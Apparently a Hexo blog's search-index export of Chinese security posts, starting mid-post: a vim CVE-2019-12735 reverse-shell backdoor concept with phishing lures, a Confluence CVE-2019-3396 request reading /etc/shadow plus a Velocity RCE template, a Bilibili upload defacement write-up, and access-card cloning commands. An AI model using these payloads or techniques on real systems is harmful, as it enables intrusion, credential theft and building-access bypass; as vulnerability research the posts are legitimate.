改造poc2加入宏后门先来说说为什么要加入宏后门，poc2中有个问题，就是当vim打开一次文档后，就不会在携带有恶意代码了从而变成一个普通文档。虽然我们可以通过第一次建立连接后下载木马来获得持久的后门，但这个方式不在讨论范围内了。这里我的想法是先实现每次打开文档都会获得反弹链接的持久后门，而不是依赖于下载外部木马。Poc2其实加了很多代码用来伪装成正常文件内容，使人即使打开文件也不会察觉到里面藏有恶意代码，而poc1则会很明显看到代码执行。这个伪装有几个特点： 受影响版本的vim和cat打开都不会显示插入的恶意代码 cat -v可以看到恶意代码 不同版本的cat可能会看到一些显示的差异，但是恶意代码依旧是看不到的 为了不破坏伪装同时做成可持续的后门，比较菜的我只想到了利用vim宏来达到这个效果。 基本实现思路首先，我们希望的是每次vim文件都会执行代码，那么有没有可能使其每次vim文件的时候都执行一边vim宏呢？这是可能的，过程如下： 在vim窗口录制宏：q{寄存器名称}，录制完成后再按下q按键停止 在～/.bashrc中写入alias vim=vim -c ‘@{寄存器名称}’ 以及shopt -s expand_aliases，通过alias替换vim别名的方式来打开文件默认执行宏 那么只要管理员重新登录shell，以后不管他vim什么文件都会执行我们写在宏里的命令 接下来要做的就是在poc2中合适的地方加入录制宏的命令，其实poc2中那些十六进制比如\x1b是ESC的意思，可以联想到这个应该是vim中切换模式的按键，因此我们可以通过在ESC之后需要执行的命令之前加入qy来开始录制宏y，在命令执行完后某个合适的位置加入q来终止宏的录制。在试了很多次后最终有了以下exp：后门exp1 进一步优化上面那个poc依旧存在几个问题： 每次执行都会疯狂的往bashrc里插入alias那两句，只要vim一次就插一次，这很不好 没有伪装成正常文件内容 为了改善第一个问题，我们可以通过分开执行两次命令，然后宏只录制第一个命令（即反弹shell），第二个插入命令只执行一次。这听起来很容易，其实做起来并不容易……多次执行会遇到很多问题，因为我太菜了所以花了很长的时间。改善第二个问题，其实也远远没有想的那么简单，以为只是在空白处插入文本即可，其实不是的，原poc中的命令会对这些文本产生影响，所以写入什么样的文本都还是有点考究的。这边给出一个最终将这两个问题都解决了并且伪装成一个PHP一句话的案例：后门exp2最后还有个vim历史命令里会残留执行的命令的问题，这个可以通过插入一些垃圾vim命令来伪装。 0x03 思考总结考虑到这个漏洞需要开启modeline选项，所以危害严重降低。不过还是可以通过钓鱼来碰运气的，因为你说不好就有生产环境的vim开了这个。假设他们开了那么这个就会成为一个Linux上类似于win上的点击病毒，只要vim了就会中招，而且会随着原文件的copy同步来扩大。还有一些mbp用户也会中招，比如你在网上散播伪装成nginx.conf的文件，诱导那些可怜的开发者来下载使用。甚至于我们可以伪装成一个一句话木马上传到目标站点，至于他能不能执行都不重要，直接发邮件给管理员伪装成安全公司来告知他们扫描发现木马，建议他们通过vim打开文件确认后删除……总之开开脑洞还是可能有利用场景的，不过我个人认为吧，没错这个漏洞就是鸡肋玩具！最后如果有朋友知道具体哪些版本和可能的场景下vim会默认打开modeline选项，还请告知谢谢啦。]]></content>
      <categories>
        <category>客户端安全</category>
      </categories>
      <tags>
        <tag>CVE-2019-12735</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-3396：confluence任意文件读取与RCE漏洞复现]]></title>
    <url>%2F2019%2F04%2F08%2FCVE-2019-3396%EF%BC%9Aconfluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[CVE-2019-3396的相关情报详细的漏洞解析参考cve-2019-3396 漏洞利用文件读取构造请求1234567891011121314151617POST /rest/tinymce/1/macro/preview HTTP/1.1Host: confluence.xxxxxx.comPragma: no-cacheCache-Control: no-cacheAccept: text/html, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36Referer: http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: xxxxxxxContent-Type: application/json;charset=utf-8X-Requested-With: XMLHttpRequestConnection: closeContent-Length: 176&#123;"contentId":"655594","macro":&#123;"name":"widget","body":"","params":&#123;"url":"https://dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"file:///etc/shadow”&#125;&#125;&#125; 通过template参数中使用file协议可以读取服务器上的任意文件 RCE由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：12#set($e="e")$e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'os.name').toString() 随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓模拟器相关]]></title>
    <url>%2F2019%2F04%2F08%2F%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[安卓模拟器杂七杂八的记录adb常规操作adb基本操作可以参考mumu模拟器官方的文档，蛮详细的adb常规操作 app备份adb backup -f “D:\myfolder\myapp.ab” -apk \adb restore “D:\myfolder\myapp.ab” mumu模拟器夜神模拟器]]></content>
      <categories>
        <category> 移动安全攻防</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>黑灰产薅羊毛</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MITMPROXY的摘要]]></title>
    <url>%2F2019%2F04%2F03%2FMITMPROXY%E7%9A%84%E6%91%98%E8%A6%81%2F</url>
    <content type="text"><![CDATA[MITMPROXY基本介绍没什么好介绍的，用过burpsuite的理解这个应该没什么难度，就是个httpproxy。主要特色是有命令行工具可以操作抓包，同时可以通过自定义python脚本来集成一些批量化请求和响应的操作比较方便。主要有mitmproxy、mitmdump、mitmweb mitmproxyMitmproxy很简单，就是个命令行的bursuite，命令行界面操作起来有点像vim，操作的时候更多是对请求进行重新编辑后重放来实现。其他和burp类似的功能，记录各种请求和响应信息。 貌似支持一个叫做key binding的功能，应该是类似于自定义快捷键和宏操作差不多的意思，主要是在它的终端中使用的。 支持通过正则配置替换规则来对内容进行替换 支持过滤，过滤语法参考mitmproxy filter 似乎支持TCP代理，但是不能对TCP流进行修改 支持websocket 支持socks proxy 支持透明模式，透明模式是指在网络层进行端口重定向到proxy上，不过不能绕过证书校验（配合ssltrip进行降级可能可行）具体参考mitmproxy透明模式mitmdumpMitmdump与proxy不同的地方在于它可以把请求响应dump出来，并且可以通过自定义的python脚本来实现规则，通过mitmdump -s xxx.py来实现。关于脚本编写的一些案例可以参考mitmproxy-scriptingmitmwebmitmproxy的web版本没有更多想说的 其他重点记录暂无]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>http抓包</tag>
        <tag>MITMPROXY</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bilibili子域名根目录挂黑页问题记录]]></title>
    <url>%2F2019%2F04%2F03%2Fbilibili%E5%AD%90%E5%9F%9F%E5%90%8D%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%8C%82%E9%BB%91%E9%A1%B5%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[昨天在群里看群友在反馈一个上传接口存在任意文件上传的问题，但是B站的管理员以content-type限制并不能造成实际影响为由认为这个问题可控，事实上确实有限制，群友们一致认为除了对客服钓鱼以外也难以利用这个缺陷。于是我也一起看了看这个接口，从而有了这个记录。 业务背景先来看看漏洞所在的业务位置：B站某客服系统具体截图：可以看到有个上传附件的功能，问题就在这个地方出现的。这个系统主要是由第三方公司承建的，所以存在较多的问题而且B站也因为一些原因只能做整体加固不能对其进行代码修改。原来的设计就是可以上传任意后缀名的附件并提供给客服审核，所以再不济也会存在钓鱼的问题。 漏洞情况没有太多好说的，就是个任意文件上传：主要问题和一些实际情况： 所有参数均可控，控制后可以改变最终路径 filename参数中会对一些特殊符号做过滤或者转义，而pid参数则相对过滤比较松 type参数是一个字典，如果为空就不会出现在路径中，目前已知的值是msg，设成msg会出现在路径中 Picture目录内可以任意写，写完后会返回路径并且可以直接访问 超过网站根目录的写直接返回400错误 对于网站根目录的写返回是成功的，但是访问的时候会显示404（指自定义文件名的时候） 上传会根据后缀名不同返回不同的content-type，基本限定在plain、img、和二进制类型，不认识的一律返回二进制contenttype web根目录可以访问，返回content-type是html 难点： content-type限制死了，在picture目录下的content-type均不能当作页面解析，也不能作为js被调用 web根目录下常规文件名均返回404，容易使人认为并没有上传成功过思考： 假设上传没有权限，如超过网站根目录，返回的是400，但是这有个问题，网站根目录和picture目录之间的上传返回的是200OK，因此推断上传可能是成功的，假设上传成功，那么404应该是nginx层面做了限制 假设是nginx层面做了限制，并且web根目录访问后是一片白，看到返回的content-type是html，那么就肯定存在默认页面比如index.html。 如果前面推测没有问题，那么进而尝试覆盖index.html或者是其他可能的默认页面文件名。 结论：尝试覆盖index.html毫无疑问是成功的，那么至少得出可以挂黑页了，并且可以用来打全站的cookies，或者是钓鱼等等。附上一张弹窗：引申： 考虑到系统框架用的是java系列，可能是stuts2或者是SpringMVC，我觉得是struts2，还可以在深挖一些东西通过覆盖一些系统框架文件来获取权限。因此我认为是存在getshell的可能的，或者使用框架漏洞来尝试 管理员说这个系统是网络隔离的，就算被攻陷风险也可控，但在我看来，如果真的被getshell，考虑到是个客服系统，可以通过构造一些更复杂的攻击payload去尝试攻击那些引用这个系统数据的内部系统，当然也可以用来钓鱼。 长期用以监控用户反馈，伪装客服对反馈用户进行诈骗也是可能的]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小米手环刷公司门禁]]></title>
    <url>%2F2019%2F04%2F02%2F%E5%B0%8F%E7%B1%B3%E6%89%8B%E7%8E%AF%E5%88%B7%E5%85%AC%E5%8F%B8%E9%97%A8%E7%A6%81%2F</url>
    <content type="text"><![CDATA[主要参考的这篇文章PN532全加密门禁卡模拟成功 记一下破解密码的相关命令 mfcuk -C -R 0:A -s 250 -S 250 #该命令貌似是破解密钥但是我没成功过，它在链接我的NFC设备的时候总报错 mfoc -O test.dmp #该命令是可以把内容整个dump出来并且可以破解key的 nfc-list #该命令是libnfc中带着的命令，可以列出UID nfc-mfsetuid xxxxxx #该命令也是libnfc中用来设置UID的命令 nfc-mfclassic w a test.dmp #该命令是用来将数据整个写入到卡里，我理解上是直接复制卡内容，但是好像是有限制的，我在复制的时候也不确定有没有成功。PS：小米手环模拟卡片后不知道为什么使用mfoc -O xxx.dmp不能dump里面的数据，但基本可以确定数据已经复制进去了。不过后来我发现虽然那些门禁卡都是加密卡，但是起作用的只是UID，所以一定程度上我们只需要复制UID就可以了。复制UID复制UID的流程就很简单了： 将需要复制的卡放到读卡器上使用nfc-list读书UID并记录 将空白卡放到读卡器上使用nfc-mfsetuid设置上面的UID 小米手环复制非加密卡功能来复制空白卡即可（因为小米限制了复制加密卡）复制加密内容经过测试部分门禁还是会校验加密内容，如果测试过只复制UID无效情况下，可以尝试下面的方法把加密内容一起复制进去，虽然手环在命令读取下没有数据返回但是通过测试发现应该还是有写入成功的。 mfoc -O test.dmp #来复制卡片内容同时会破解卡片 先通过复制UID的过程让小米手环模拟白卡 修改test.dmp文件中，将除了有数据的64blok保留其他都删掉 按照文章中所示修改对应行的数据 nfc-mfclassic w a test.dmp #将文件内的数据写入到卡片里PS：读卡器可能会因为驱动问题写入失败，多试几次确保写入成功。]]></content>
      <categories>
        <category>物联网</category>
      </categories>
      <tags>
        <tag>极客</tag>
        <tag>物联网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于淘宝二维码问题的一些想法]]></title>
    <url>%2F2019%2F03%2F29%2F%E5%85%B3%E4%BA%8E%E6%B7%98%E5%AE%9D%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95%2F</url>
    <content type="text"><![CDATA[今天fb上发了一篇关于淘宝二维码钓鱼的文章，不过该文章估计也快被公关了，暂时甩个还能访问的链接淘宝二维码钓鱼问题原文 大致描述总结下来大概的意思就是如何利用淘口令结合网页扫码登录来进行钓鱼。流程为：使用后端服务自动提取登录二维码的链接->转换成淘口令->散布淘口令->用户复制淘口令后进入淘宝APP->淘宝APP内部转换淘口令后跳转登录授权->用户受骗点击登录->后端服务获取到用户的授权即可登录淘宝。 问题反思一开始看的时候很容易让人以为出问题的是二维码扫描登录，其实并不完全是，因为这本身是一个钓鱼的场景，无论我们如何优化二维码扫描登录也无法避免被用来钓鱼。而让这个场景变得更容易被钓鱼的本身原因应该有下面那么几个： 淘口令生成时候对链接校验不足，本质上还是一个短链接生成服务，虽然有对域名进行校验但是使用URL跳转漏洞可以绕过，那么对于淘口令生成的方面需要加强业务场景的校验，非业务场景的链接应该不予生成。 淘口令在淘宝APP里打开时候没有做严格的场景限定，应该在APP内限制淘口令仅能用来唤起相应的商品或者店铺，而不是跳转到授权登录页。 扫码登录的链接应该只能通过淘宝APP扫码来实现，非该操作都不能通过APP内部逻辑来唤醒，本质上还是对于场景的校验不足。 我个人认为应该按照这么个逻辑来修复这个问题，本质上还是对于钓鱼的场景进行限制即可。没有必要修改二维码扫码登录的协议，最多就是看看还有没有什么加固的空间。当然换句话说，除了淘口令可能被利用以外，如果没有在APP内对于链接唤醒协议的场景做限制，可能还有其他类似的功能也可以被用来做钓鱼。]]></content>
      <categories>
        <category>案例记录与反思</category>
      </categories>
      <tags>
        <tag>钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F03%2F27%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
